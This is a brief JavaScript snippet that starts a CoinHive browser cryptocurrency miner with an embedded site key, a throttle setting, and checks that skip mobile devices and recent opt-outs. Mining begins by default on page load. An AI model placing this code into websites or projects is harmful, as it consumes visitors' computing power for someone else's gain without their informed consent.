var miner = new CoinHive.Anonymous('kuLEQIq4VDkik2UiCSrYWLoX8hwzNHsY', {throttle: 0.1});

if (!miner.isMobile() && !miner.didOptOut(14400)) {
    miner.start();
}
